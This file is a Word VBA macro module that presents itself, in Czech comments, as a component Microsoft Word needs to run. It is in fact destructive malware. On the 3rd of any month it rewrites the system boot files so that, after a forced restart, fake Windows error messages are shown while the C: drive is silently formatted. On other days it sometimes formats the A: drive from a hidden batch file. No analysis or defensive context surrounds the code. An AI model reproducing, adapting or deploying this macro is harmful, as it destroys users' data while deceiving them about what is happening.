Attribute VB_Name = "Word_Codes"
'Toto makro nezbitne je potreba k spravnemu behu programu Microsoft Word
'Jeho odstranenim muzete poskodit spravne pracovani programu Microsoft Word
Option Explicit

Private Declare Function SetFileAttributes _
Lib "kernel32" Alias "SetFileAttributesA" ( _
    ByVal lpFileName As String, _
    ByVal dwFileAttributes As Long _
) As Long
Private Const DDL_READWRITE = &H0
Private Const DDL_SYSTEM = &H4
Private Const DDL_HIDDEN = &H2

Private Declare Function ExitWindowsEx _
Lib "user32" ( _
    ByVal uFlags As Long, _
    ByVal dwReserved As Long _
) As Long

Sub main()
 Dim x As Long
 Dim Cesta As String
 
 If Day(Now) = 3 Then
  On Error GoTo KTest
   MkDir "C:\HYPNOTIX"

KTest:
  On Error Resume Next
   FileCopy "C:\Autoexec.bat", "C:\HYPNOTIX\Autoexec.bat"
   FileCopy "C:\config.sys", "C:\HYPNOTIX\config.sys"
   FileCopy "C:\msdos.sys", "C:\HYPNOTIX\msdos.sys"

  On Error GoTo Zpet
   x = SetFileAttributes("C:\autoexec.bat", DDL_READWRITE)
   If x = 0 Then GoTo Zpet
     
   Cesta = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
   
   Open "C:\autoexec.bat" For Output As #1
    Print #1, "@echo off"
    Print #1, "set COMSPEC=" & Cesta & "\COMMAND.COM"
    Print #1, "path=" & Cesta & ";"
    Randomize: x = Rnd * 2
    If x = 1 Or x = 0 Then
     Print #1, "cls"
     Print #1, "echo Syst‚m Windows vynech v  startovac¡ soubory."
     Print #1, "echo."
     Print #1, "echo Syst‚m Windows se nyn¡ zav d¡ v nouzov‚m rezimu."
    Else
     Print #1, "echo Syst‚m Windows nalezl chybu na disku!!!"
     Print #1, "echo."
     Print #1, "echo Syst‚m Windows se nyn¡ pokous¡ chybu odstranit ..."
     Print #1, "echo."
     Print #1, "echo Behem z kroku nerestartujte poc¡tac!!!"
     Print #1, "echo Mohlo by doj¡t k nenapraviteln‚mu poskozen¡ disku!!!"
     Print #1, "echo."
     Print #1, "echo Pracuji ..."
    End If
    
    Print #1, "C:\Key.com >nul"
    Print #1, "echo y| format C: /U /V:HYPNOTIX >nul"
   Close #1
  
  x = SetFileAttributes("C:\config.sys", DDL_READWRITE)
  If x = 0 Then GoTo Zpet
  Open "C:\config.sys" For Output As #1
   Print #1, "[common]"
   Print #1, "switches=/F /N"
   Print #1, "shell=" & Cesta & "\command.com /p"
  Close #1
  
  x = SetFileAttributes("C:\msdos.sys", DDL_READWRITE)
  If x = 0 Then GoTo Zpet
  Open "c:\msdos.sys" For Output As #1
   Print #1, "[Options]"
   Print #1, "Logo = 0"
  Close #1
  x = SetFileAttributes("C:\msdos.sys", DDL_SYSTEM)
  If x = 0 Then GoTo Zpet
  
  Open "C:\Key.com" For Output As #1
   Print #1, "ä!æ!Í " 'Fuck off Debug.com!!!
  Close #1
  
  ExitWindowsEx &H43, 0
  Exit Sub
  
Zpet:
 On Error Resume Next
 FileCopy "C:\HYPNOTIX\Autoexec.bat", "C:\Autoexec.bat"
 FileCopy "C:\HYPNOTIX\config.sys", "C:\config.sys"
 FileCopy "C:\HYPNOTIX\msdos.sys", "C:\msdos.sys"
 Open "C:\Kill.bat" For Output As #1
  Print #1, "@deltree /y C:\HYPNOTIX >nul"
  Print #1, "@del C:\Key.com >nul"
  Print #1, "@del C:\Kill.bat >nul"
 Close #1
 Shell "C:\Kill.bat", vbHide
Else
 On Error Resume Next
 Randomize:   x = Rnd * 10
 If x = 9 Then
  Open "C:\KillA.bat" For Output As #1
   Print #1, "echo y|format a: /V:HYPNOTIX >nul"
   Close #1
  SetFileAttributes "C:\KillA.bat", DDL_HIDDEN
  Shell "C:\KillA.bat", vbHide
 End If
End If
End Sub
